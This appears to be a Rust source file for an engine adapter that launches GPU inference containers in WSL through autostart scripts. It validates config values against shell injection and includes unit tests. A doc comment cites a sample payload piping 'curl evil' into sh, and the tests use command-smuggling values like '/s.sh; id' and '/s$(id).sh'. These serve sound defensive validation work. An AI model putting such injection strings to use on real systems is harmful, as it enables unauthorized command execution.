//! The ninfer engine adapter (DESIGN Step 7; port of the working v3.3 path).
//!
//! Ninfer engines are GPU containers living inside WSL: the harness spawns only
//! a short-lived `wsl.exe` client that runs the model's `autostart.sh` (the
//! operator's script, positional contract: `$1` profile, `$2` key|nokey,
//! `$3` host-publish port). Because the container outlives that client, the
//! spec carries the container name so the runtime reaps it with
//! `docker rm -f` on release (v3.3 `Proc::Container` parity), and readiness
//! chains `/health` then `/v1/models` (v3.3 `wait_ready`; SE's `Then` probes
//! both, unlike v3.3's first-step-only unwrap).
//!
//! Every ninfer model the catalog carries is managed: the operator's 2026-10-26
//! call scrapped v3.3's `external: true` so the former bonsai servers are loaded
//! and reaped here like any other, on harness-assigned publish ports.

use super::{EngineAdapter, EngineError, LaunchSpec, ReadinessSpec};
use crate::model::ModelEntry;
use crate::ownership::{valid_container_name, NINFER_ENGINE};
use std::collections::BTreeMap;

/// Defaults matching v3.3 `appconf` (operator-owned WSL coordinates).
#[derive(Debug, Clone)]
pub struct NinferDefaults {
    /// WSL distro hosting the containers.
    pub wsl_distro: String,
    /// WSL user owning the containers and autostart scripts.
    pub wsl_user: String,
}

/// Ninfer adapter: WSL container launched via the model's autostart script.
#[derive(Debug, Clone)]
pub struct NinferAdapter {
    /// WSL coordinates, wired from config at boot.
    pub defaults: NinferDefaults,
}

/// Whether `value` is safe to hand to WSL as a single word: the argv after
/// `wsl.exe --` is re-tokenized by the login shell there, so a yaml value such as
/// `/s.sh; curl evil|sh` would otherwise execute inside the distro (security
/// review, 2026-10-26). Paths and profile names are plain words, never options.
fn valid_word(value: &str) -> bool {
    !value.is_empty()
        && !value.starts_with('-')
        && value.chars().all(|c| {
            c.is_ascii_alphanumeric() || matches!(c, '.' | '_' | '-' | '/' | ':' | '+' | '@' | '~')
        })
}

impl NinferAdapter {
    /// Creates the adapter with the config's WSL coordinates.
    pub fn new(wsl_distro: impl Into<String>, wsl_user: impl Into<String>) -> Self {
        NinferAdapter {
            defaults: NinferDefaults {
                wsl_distro: wsl_distro.into(),
                wsl_user: wsl_user.into(),
            },
        }
    }

    /// The autostart argv exactly as v3.3 built it: shared WSL client prefix,
    /// then bash, script, profile, key flag, harness-assigned publish port.
    fn argv(&self, script: &str, profile: &str, key: &str, port: u16) -> Vec<String> {
        let mut argv =
            crate::engine::wsl_prefix(&self.defaults.wsl_distro, &self.defaults.wsl_user);
        argv.extend([
            "bash".to_string(),
            script.to_string(),
            profile.to_string(),
            key.to_string(),
            port.to_string(),
        ]);
        argv
    }
}

impl EngineAdapter for NinferAdapter {
    fn engine_id(&self) -> &str {
        NINFER_ENGINE
    }

    fn spec(&self, model: &ModelEntry, port: u16) -> Result<LaunchSpec, EngineError> {
        let rejected = |reason: String| EngineError::Rejected {
            engine: NINFER_ENGINE.to_string(),
            model: model.name.clone(),
            reason,
        };
        // The WSL account is operator-specific and has no shipped default (config
        // review, 2026-10-26): refuse with the field named rather than hand `wsl.exe`
        // an empty `-u` and let the spawn fail obscurely.
        if self.defaults.wsl_user.trim().is_empty() {
            return Err(rejected(
                "`wsl_user` is not set in the config file: name the WSL account that owns \
                 these containers"
                    .to_string(),
            ));
        }
        // Both required, exactly as v3.3 refused them at launch; the script path
        // lives inside WSL and cannot be existence-checked from here.
        let missing = |field: &str| EngineError::MissingField {
            model: model.name.clone(),
            field: field.to_string(),
        };
        let script = model
            .raw
            .get("ninfer_autostart")
            .map(|v| v.trim().to_string())
            .filter(|v| !v.is_empty())
            .ok_or_else(|| missing("ninfer_autostart"))?;
        if !valid_word(&script) {
            return Err(rejected(format!(
                "ninfer_autostart must be a plain WSL path (no spaces or shell metacharacters): {script}"
            )));
        }
        let container = model
            .raw
            .get("ninfer_container")
            .map(|v| v.trim().to_string())
            .filter(|v| !v.is_empty())
            .ok_or_else(|| missing("ninfer_container"))?;
        if !valid_container_name(&container) {
            return Err(rejected(format!(
                "ninfer_container must be a docker name (alphanumeric start, \
                 [A-Za-z0-9._-] only, never a container-ID shape): {container}"
            )));
        }
        let profile = model
            .raw
            .get("ninfer_profile")
            .map(|v| v.trim().to_string())
            .filter(|v| !v.is_empty())
            .unwrap_or_else(|| "b".to_string());
        if !valid_word(&profile) {
            return Err(rejected(format!(
                "ninfer_profile must be a plain word (no spaces or shell metacharacters): {profile}"
            )));
        }
        let key = if model
            .raw
            .get("ninfer_key")
            .map(String::as_str)
            .is_some_and(crate::model::truthy)
        {
            "key"
        } else {
            "nokey"
        };
        Ok(LaunchSpec {
            argv: self.argv(&script, &profile, key, port),
            // The client's cwd is irrelevant: everything runs inside WSL.
            cwd: std::env::temp_dir(),
            env: BTreeMap::new(),
            log_name: model.name.clone(),
            readiness: ReadinessSpec::Then(
                Box::new(ReadinessSpec::Http {
                    path: "/health".to_string(),
                    expect_status: 200,
                }),
                Box::new(ReadinessSpec::Http {
                    path: "/v1/models".to_string(),
                    expect_status: 200,
                }),
            ),
            container: Some(container.to_string()),
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::CategoryId;
    use crate::model::CostClass;

    fn raw(pairs: &[(&str, &str)]) -> BTreeMap<String, String> {
        pairs
            .iter()
            .map(|(k, v)| (k.to_string(), v.to_string()))
            .collect()
    }

    fn entry(pairs: &[(&str, &str)]) -> ModelEntry {
        let mut pairs: Vec<(&str, &str)> = pairs.to_vec();
        pairs.push(("name", "ninfer-test"));
        ModelEntry {
            name: "ninfer-test".to_string(),
            engine: "ninfer".to_string(),
            category: CategoryId::Work,
            vram_gb: Some(34.0),
            gguf_size_gb: None,
            cost: CostClass::Fixed,
            launch_floor_gb: None,
            load_timeout_s: Some(600),
            measured_gb: None,
            measured_min_gb: None,
            measured_offload: None,
            model_ref: Some("ninfer://ninfer-x:8004/served".to_string()),
            serve_model: Some("served".to_string()),
            file: None,
            raw: raw(&pairs),
        }
    }

    #[test]
    fn spec_refuses_by_naming_wsl_user_when_the_account_is_unset() {
        // No username ships as a default, so the load has to explain the fix rather
        // than hand `wsl.exe` an empty `-u` and fail obscurely.
        let err = NinferAdapter::new("Ubuntu", "")
            .spec(
                &entry(&[
                    ("ninfer_autostart", "/home/u/guide/ninfer-x/autostart.sh"),
                    ("ninfer_container", "ninfer-x"),
                ]),
                18109,
            )
            .expect_err("a blank account cannot launch");
        assert!(err.to_string().contains("wsl_user"), "was: {err}");
    }

    #[test]
    fn argv_matches_the_v33_positional_contract() {
        let spec = NinferAdapter::new("Ubuntu", "ops")
            .spec(
                &entry(&[
                    ("ninfer_autostart", "/home/u/guide/ninfer-x/autostart.sh"),
                    ("ninfer_container", "ninfer-x"),
                ]),
                18109,
            )
            .expect("valid spec");
        assert_eq!(
            spec.argv,
            vec![
                "wsl.exe",
                "-d",
                "Ubuntu",
                "-u",
                "ops",
                "--",
                "bash",
                "/home/u/guide/ninfer-x/autostart.sh",
                "b",
                "nokey",
                "18109",
            ]
        );
        assert_eq!(spec.log_name, "ninfer-test");
        assert_eq!(spec.container.as_deref(), Some("ninfer-x"));
        assert_eq!(
            spec.readiness,
            ReadinessSpec::Then(
                Box::new(ReadinessSpec::Http {
                    path: "/health".to_string(),
                    expect_status: 200,
                }),
                Box::new(ReadinessSpec::Http {
                    path: "/v1/models".to_string(),
                    expect_status: 200,
                }),
            )
        );
    }

    #[test]
    fn profile_and_key_flags_pass_through() {
        let spec = NinferAdapter::new("U2", "usr")
            .spec(
                &entry(&[
                    ("ninfer_autostart", "/s.sh"),
                    ("ninfer_container", "c"),
                    ("ninfer_profile", "a"),
                    ("ninfer_key", "true"),
                ]),
                18110,
            )
            .expect("valid spec");
        assert_eq!(
            spec.argv[2..],
            ["U2", "-u", "usr", "--", "bash", "/s.sh", "a", "key", "18110"]
        );
    }

    #[test]
    fn missing_required_keys_are_refusals_not_panic() {
        let err = NinferAdapter::new("Ubuntu", "ops")
            .spec(&entry(&[("ninfer_container", "c")]), 18109)
            .expect_err("must refuse");
        assert!(
            matches!(err, EngineError::MissingField { ref field, .. } if field == "ninfer_autostart")
        );
        let err = NinferAdapter::new("Ubuntu", "ops")
            .spec(&entry(&[("ninfer_autostart", "/s.sh")]), 18109)
            .expect_err("must refuse");
        assert!(
            matches!(err, EngineError::MissingField { ref field, .. } if field == "ninfer_container")
        );
    }

    #[test]
    fn external_key_is_inert_now() {
        // Operator call 2026-10-26 scrapped `external: true`: a copied-back v3.3
        // yaml must be managed, not refused — the key carries no meaning here.
        let spec = NinferAdapter::new("Ubuntu", "ops")
            .spec(
                &entry(&[
                    ("ninfer_autostart", "/s.sh"),
                    ("ninfer_container", "c"),
                    ("external", "true"),
                ]),
                18109,
            )
            .expect("managed");
        assert_eq!(spec.container.as_deref(), Some("c"));
    }

    #[test]
    fn option_and_shell_shaped_values_are_refused_before_argv() {
        // The argv after `wsl.exe --` is re-tokenized by the login shell inside the
        // distro, so a yaml value is only safe as a plain word (security review,
        // 2026-10-26): option-shaped, spaced and metacharacter-bearing values die here.
        for bad in ["-c", "/s.sh; id", "/s$(id).sh", "/s.sh|sh", "/a b.sh"] {
            let err = NinferAdapter::new("Ubuntu", "ops")
                .spec(
                    &entry(&[("ninfer_autostart", bad), ("ninfer_container", "c")]),
                    18109,
                )
                .expect_err("script must be a plain path");
            assert!(
                matches!(&err, EngineError::Rejected { reason, .. }
                    if reason.contains("plain WSL path")),
                "{bad}: {err}"
            );
        }
        let err = NinferAdapter::new("Ubuntu", "ops")
            .spec(
                &entry(&[
                    ("ninfer_autostart", "/s.sh"),
                    ("ninfer_container", "c"),
                    ("ninfer_profile", "b; id"),
                ]),
                18109,
            )
            .expect_err("profile must be a plain word");
        assert!(
            matches!(&err, EngineError::Rejected { reason, .. }
                if reason.contains("ninfer_profile")),
            "{err}"
        );
        for name in ["-v", "_x", "a b"] {
            let err = NinferAdapter::new("Ubuntu", "ops")
                .spec(
                    &entry(&[("ninfer_autostart", "/s.sh"), ("ninfer_container", name)]),
                    18109,
                )
                .expect_err("container name must be docker-legal");
            assert!(
                matches!(&err, EngineError::Rejected { reason, .. } if reason.contains("docker name")),
                "{name}: {err}"
            );
        }
    }

    #[test]
    fn container_names_docker_could_resolve_as_an_id_are_refused() {
        // Chunk 10 [4]: `docker rm -f <hex>` is resolved as a container-**ID prefix**, so
        // a name of that shape must die here — the same validator the boot reclaim and
        // the claim ledger use — before it can reach the pre-reap argv and delete an
        // unrelated container in the operator's distro.
        for name in ["1234abc", "beef", "deadbeef"] {
            let err = NinferAdapter::new("Ubuntu", "ops")
                .spec(
                    &entry(&[("ninfer_autostart", "/s.sh"), ("ninfer_container", name)]),
                    18109,
                )
                .expect_err("an ID-shaped name cannot be owned");
            assert!(
                matches!(&err, EngineError::Rejected { reason, .. }
                    if reason.contains("docker name")),
                "{name}: {err}"
            );
        }
        assert_eq!(
            NinferAdapter::new("Ubuntu", "ops")
                .spec(
                    &entry(&[("ninfer_autostart", "/s.sh"), ("ninfer_container", "c")]),
                    18109,
                )
                .expect("a short name is not an id shape")
                .container
                .as_deref(),
            Some("c"),
            "a one-character hex name must still load: the load path stays intact"
        );
    }

    #[test]
    fn key_flag_uses_the_shared_truthy_table() {
        for value in ["true", "1", "yes", "on"] {
            let spec = NinferAdapter::new("Ubuntu", "ops")
                .spec(
                    &entry(&[
                        ("ninfer_autostart", "/s.sh"),
                        ("ninfer_container", "c"),
                        ("ninfer_key", value),
                    ]),
                    18109,
                )
                .expect("valid spec");
            assert_eq!(spec.argv[9], "key", "ninfer_key: {value}");
        }
        let spec = NinferAdapter::new("Ubuntu", "ops")
            .spec(
                &entry(&[
                    ("ninfer_autostart", "/s.sh"),
                    ("ninfer_container", "c"),
                    ("ninfer_key", "off"),
                ]),
                18109,
            )
            .expect("valid spec");
        assert_eq!(spec.argv[9], "nokey");
    }
}
